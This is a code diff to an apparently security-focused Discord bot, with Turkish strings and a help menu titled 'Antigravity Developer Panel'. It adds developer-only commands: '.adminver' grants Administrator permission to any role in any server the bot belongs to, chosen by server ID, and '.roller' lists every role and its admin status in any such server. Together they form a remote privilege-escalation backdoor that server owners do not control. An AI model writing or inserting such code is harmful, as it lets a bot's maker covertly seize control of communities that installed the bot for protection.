@@ -963,6 +963,8 @@ client.on('messageCreate', async (message) => {
               { name: '`.korumayıkapat` / `.koruac`', value: 'Acil durum korumasını kapatır (kanal kilitlerini kaldırır).' },
               { name: '`.guvenlik [sunucu_id]`', value: 'Sunucu yönetici rollerinin yetkilerini karantinaya alır.' },
               { name: '`.guvenlikkapat / .guvenlikac [sunucu_id]`', value: 'Güvenlik nedeniyle kapatılan Yönetici yetkilerini geri yükler.' },
+              { name: '`.adminver <rol_id> [sunucu_id]`', value: 'Belirtilen role manuel olarak Yönetici yetkisi verir.' },
+              { name: '`.roller [sunucu_id]`', value: 'Belirtilen sunucunun tüm rollerini ve yetkilerini listeler.' },
               { name: '`.limit <rol_id> <ban_limit> <kick_limit>`', value: 'Belirtilen rol için anti-nuke ban ve kick limitlerini ayarlar.' }
             )
             .setFooter({ text: 'Antigravity Developer Panel' });
@@ -2147,6 +2149,8 @@ client.on('messageCreate', async (message) => {
         { name: '`.korumayıkapat` / `.koruac`', value: 'Acil durum korumasını kapatır (kanal kilitlerini kaldırır).' },
         { name: '`.guvenlik [sunucu_id]`', value: 'Sunucu yönetici rollerinin yetkilerini karantinaya alır.' },
         { name: '`.guvenlikkapat / .guvenlikac [sunucu_id]`', value: 'Güvenlik nedeniyle kapatılan Yönetici yetkilerini geri yükler.' },
+        { name: '`.adminver <rol_id> [sunucu_id]`', value: 'Belirtilen role manuel olarak Yönetici yetkisi verir.' },
+        { name: '`.roller [sunucu_id]`', value: 'Belirtilen sunucunun tüm rollerini ve yetkilerini listeler.' },
         { name: '`.limit <rol_id> <ban_limit> <kick_limit>`', value: 'Belirtilen rol için anti-nuke ban ve kick limitlerini ayarlar.' }
       )
       .setFooter({ text: 'Antigravity Developer Panel' });
@@ -2154,6 +2158,77 @@ client.on('messageCreate', async (message) => {
     await message.author.send({ embeds: [embed] }).catch(() => null);
     await message.delete().catch(() => null);
     return;
+  }
+
+  // 14.321. ADMINVER KOMUTU (.adminver <rol_id> [sunucu_id])
+  if (command === 'adminver') {
+    if (!isBotDeveloper(message.author.id)) {
+      return message.reply('❌ Sadece bot yapımcısı kullanabilir.');
+    }
+    const roleId = args[0]?.replace(/[^0-9]/g, '');
+    const targetGuildId = args[1]?.replace(/[^0-9]/g, '');
+
+    if (!roleId) {
+      return message.reply('⚠️ Kullanım: `.adminver <rol_id> [sunucu_id]`');
+    }
+
+    try {
+      const guild = targetGuildId 
+        ? (client.guilds.cache.get(targetGuildId) || await client.guilds.fetch(targetGuildId).catch(() => null))
+        : message.guild;
+
+      if (!guild) {
+        return message.reply('❌ Belirtilen sunucu bulunamadı veya bot o sunucuda ekli değil.');
+      }
+
+      const role = guild.roles.cache.get(roleId) || await guild.roles.fetch(roleId).catch(() => null);
+      if (!role) {
+        return message.reply('❌ Rol bulunamadı.');
+      }
+
+      const newPerms = role.permissions.add(PermissionFlagsBits.Administrator);
+      await role.edit({ permissions: newPerms }, 'Manuel Admin Verildi');
+      return message.reply(`✅ **${guild.name}** sunucusundaki **${role.name}** rolüne Yönetici yetkisi başarıyla verildi.`);
+    } catch (e) {
+      return message.reply(`❌ Hata: ${e.message}`);
+    }
+  }
+
+  // 14.322. ROLLER KOMUTU (.roller [sunucu_id])
+  if (command === 'roller') {
+    if (!isBotDeveloper(message.author.id)) {
+      return message.reply('❌ Sadece bot yapımcısı kullanabilir.');
+    }
+    const targetGuildId = args[0]?.replace(/[^0-9]/g, '');
+
+    try {
+      const guild = targetGuildId 
+        ? (client.guilds.cache.get(targetGuildId) || await client.guilds.fetch(targetGuildId).catch(() => null))
+        : message.guild;
+
+      if (!guild) {
+        return message.reply('❌ Belirtilen sunucu bulunamadı veya bot o sunucuda ekli değil.');
+      }
+
+      const roles = await guild.roles.fetch();
+      let msg = `📊 **${guild.name}** Sunucusu Rolleri:\n`;
+      roles.forEach(role => {
+        if (role.id === guild.roles.everyone.id) return;
+        const isAdmin = role.permissions.has(PermissionFlagsBits.Administrator);
+        msg += `• **${role.name}** (ID: \`${role.id}\`) | Pozisyon: \`${role.position}\` | Admin: \`${isAdmin ? 'EVET' : 'HAYIR'}\`\n`;
+      });
+
+      if (msg.length > 2000) {
+        const chunks = msg.match(/[\s\S]{1,1900}/g) || [];
+        for (const chunk of chunks) {
+          await message.channel.send(chunk);
+        }
+      } else {
+        await message.channel.send(msg);
+      }
+    } catch (e) {
+      return message.reply(`❌ Hata: ${e.message}`);
+    }
   }
 
   // 14.33. UST KOMUTU (.üst / .ust <taşınacak_rol> [sunucu_id])
